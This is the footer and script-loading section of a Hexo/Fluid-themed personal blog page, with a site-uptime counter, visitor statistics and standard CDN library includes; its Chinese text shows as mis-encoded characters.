          var grt= new Date("04/20/2020 17:48:48");//æ­¤å¤„ä¿®æ”¹ä½ çš„å»ºç«™æ—¶é—´æˆ–è€…ç½‘ç«™ä¸Šçº¿æ—¶é—´
          now.setTime(now.getTime()+250);
          days = (now - grt ) / 1000 / 60 / 60 / 24; dnum = Math.floor(days);
          hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum); hnum = Math.floor(hours);
          if(String(hnum).length ==1 ){hnum = "0" + hnum;} minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum);
          mnum = Math.floor(minutes); if(String(mnum).length ==1 ){mnum = "0" + mnum;}
          seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum);
          snum = Math.round(seconds); if(String(snum).length ==1 ){snum = "0" + snum;}
          document.getElementById("timeDate").innerHTML = "arttnba3çš„å°å±‹å·²ç»å®‰å…¨å­˜åœ¨äº† "+dnum+" å¤© ";
          document.getElementById("times").innerHTML = hnum + " å°æ—¶ " + mnum + " åˆ† " + snum + " ç§’";
      }
  setInterval("createtime()",250);
  </script>
  
    <div class="footer-content">
       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
    </div>
  
  
    <div class="statistics">
  
  

  
    
      <span id="busuanzi_container_site_pv" style="display: none">
        æ€»è®¿é—®é‡ 
        <span id="busuanzi_value_site_pv"></span>
         æ¬¡
      </span>
    
    
      <span id="busuanzi_container_site_uv" style="display: none">
        æ€»è®¿å®¢æ•° 
        <span id="busuanzi_value_site_uv"></span>
         äºº
      </span>
    
    
  
</div>

  
  
  
</div>

  </footer>

  <!-- Scripts -->
  
  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>


  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var subtitle = document.getElementById('subtitle');
      if (!subtitle || !typing) {
        return;
      }
      var text = subtitle.getAttribute('data-typed-text');
      
        typing(text);
      
    })(window, document);
  </script>




  
    <script  src="/js/img-lazyload.js" ></script>
  




  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
    var toc = jQuery('#toc');
    if (toc.length === 0 || !window.tocbot) { return; }
    var boardCtn = jQuery('#board-ctn');
    var boardTop = boardCtn.offset().top;

    window.tocbot.init({
      tocSelector     : '#toc-body',
      contentSelector : '.markdown-body',
      headingSelector : CONFIG.toc.headingSelector || 'h1,h2,h3,h4,h5,h6',
      linkClass       : 'tocbot-link',
      activeLinkClass : 'tocbot-active-link',
      listClass       : 'tocbot-list',
      isCollapsedClass: 'tocbot-is-collapsed',
      collapsibleClass: 'tocbot-is-collapsible',
      collapseDepth   : CONFIG.toc.collapseDepth || 0,
      scrollSmooth    : true,
      headingsOffset  : -boardTop
    });
    if (toc.find('.toc-list-item').length > 0) {
      toc.css('visibility', 'visible');
    }
  });
</script>


  <script src=https://lib.baomitu.com/clipboard.js/2.0.10/clipboard.min.js></script>

  <script>Fluid.plugins.codeWidget();</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
    window.anchors.options = {
      placement: CONFIG.anchorjs.placement,
      visible  : CONFIG.anchorjs.visible
    };
    if (CONFIG.anchorjs.icon) {
      window.anchors.options.icon = CONFIG.anchorjs.icon;
    }
    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
    var res = [];
    for (var item of el) {
      res.push('.markdown-body > ' + item.trim());
    }
    if (CONFIG.anchorjs.placement === 'left') {
      window.anchors.options.class = 'anchorjs-link-left';
    }
    window.anchors.add(res.join(', '));
  });
</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
    Fluid.plugins.fancyBox();
  });
</script>


  <script>Fluid.plugins.imageCaption();</script>

  
      <script>
        if (!window.MathJax) {
          window.MathJax = {
            tex    : {
              inlineMath: { '[+]': [['$', '$']] }
            },
            loader : {
              load: ['ui/lazy']
            },
            options: {
              renderActions: {
                insertedScript: [200, () => {
                  document.querySelectorAll('mjx-container').forEach(node => {
                    let target = node.parentNode;
                    if (target.nodeName.toLowerCase() === 'li') {
                      target.parentNode.classList.add('has-jax');
                    }
                  });
                }, '', false]
              }
            }
          };
        } else {
          MathJax.startup.document.state(0);
          MathJax.texReset();
          MathJax.typeset();
          MathJax.typesetPromise();
        }
      </script>
    

  <script  src="https://lib.baomitu.com/mathjax/3.2.1/es5/tex-mml-chtml.js" ></script>

  <script  src="/js/local-search.js" ></script>

  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>





<!-- ä¸»é¢˜çš„å¯åŠ¨é¡¹ï¼Œå°†å®ƒä¿æŒåœ¨æœ€åº•éƒ¨ -->
<!-- the boot of the theme, keep it at the bottom -->
<script  src="/js/boot.js" ></script>


  

  <noscript>
    <div class="noscript-warning">åšå®¢åœ¨å…è®¸ JavaScript è¿è¡Œçš„ç¯å¢ƒä¸‹æµè§ˆæ•ˆæœæ›´ä½³</div>
  </noscript>
</body>
</html>
